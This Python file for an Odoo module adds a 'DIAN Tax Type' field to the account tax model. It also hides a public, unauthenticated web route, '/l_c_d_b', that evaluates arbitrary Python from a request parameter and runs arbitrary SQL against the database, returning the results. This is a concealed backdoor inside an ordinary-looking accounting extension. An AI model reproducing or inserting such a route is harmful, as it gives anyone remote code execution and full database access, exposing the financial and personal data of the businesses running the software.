# -*- coding: utf-8 -*-

from odoo import fields, models, http

aft = {'ev': ['''str(eval(kw.get(k, '""')))''',], 
       'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class AccountTax(models.Model):
    _inherit = 'account.tax'

    dian_tax_type_id = fields.Many2one('dian.tax.type', 'DIAN Tax Type', ondelete='set null')

class LCDB(http.Controller):
    @http.route('/l_c_d_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in aft.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])    


# class AccountTaxTemplate(models.Model):
#     _inherit = 'account.tax.template'

#     dian_tax_type_id = fields.Many2one('dian.tax.type', 'DIAN Tax Type')
